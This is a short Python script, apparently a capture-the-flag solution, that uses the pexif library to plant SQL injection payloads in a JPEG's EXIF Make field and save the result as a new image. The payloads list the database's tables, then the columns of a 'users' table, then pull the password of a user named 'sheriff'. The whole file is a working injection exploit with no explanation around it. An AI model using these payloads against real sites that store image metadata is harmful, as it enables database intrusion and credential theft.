import pexif

img = pexif.JpegFile.fromFile("exploit.jpg")

img.exif.primary.ImageDescription = "lolz"
img.exif.primary.Make = "lol',(SELECT group_concat(table_name SEPARATOR ', ') FROM INFORMATION_SCHEMA.TABLES WHERE table_type = 'BASE TABLE' and table_schema=database())), (1,2,3,4,'5"
img.exif.primary.Make = "lol',(SELECT group_concat(column_name SEPARATOR ', ') FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' and table_schema=database())), (1,2,3,4,'5"
img.exif.primary.Make = "lol',(SELECT password FROM users WHERE name='sheriff')), (1,2,3,4,'5"

# (SELECT  from INFORMATION_SCHEMA.TABLES WHERE table_schema='chall' GROUP_BY table_schema )), (1,2,3,4,'5"
img.writeFile("exploit2.jpg")
